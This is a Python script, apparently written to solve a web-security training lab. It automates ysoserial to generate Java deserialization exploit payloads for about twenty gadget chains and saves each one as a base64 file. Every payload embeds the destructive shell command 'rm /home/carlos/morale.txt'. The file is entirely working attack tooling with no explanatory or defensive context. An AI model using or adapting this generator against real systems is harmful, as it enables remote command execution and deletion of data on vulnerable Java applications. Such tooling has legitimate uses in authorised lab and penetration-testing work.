import os
import re
import base64
import shutil
import subprocess
import time

import urllib3

payloads = [
    'BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2',
    'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'Myfaces1', 'ROME', 'Spring1', 'Spring2'
]

def generate(payloads, cmd):
    for payload in payloads:
        print('Exploiting for: ' + payload)
        
        command = subprocess.Popen(
            ['python', './ysoserial-automate.py', '-j', './ysoserial.jar', '-p', payload, '-c', cmd],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        # while True:
        #     output = command.stdout.readline().decode().strip()
        #     print(output)  # Print the output for visibility
            
        #     if output.endswith('y/n)'):  # Check for the prompt
        #         command.stdin.write(b"n\n")  # Automatically answer "no"
        #         command.stdin.flush()
        #         break
        
        res, err = command.communicate()
        
        if command.returncode == 0:
            payload_name = '{}_payload.b64'.format(payload)
            payload_file = './ysoserial_payload.b64'
            shutil.copy(payload_file, './payloads/' + payload_name)
            print('Generated payload ' + payload + ' 🚀')
        else:
            print('Failed to generate payload for ' + payload + ' ❌')

cmd = 'rm /home/carlos/morale.txt'
generate(payloads, cmd)


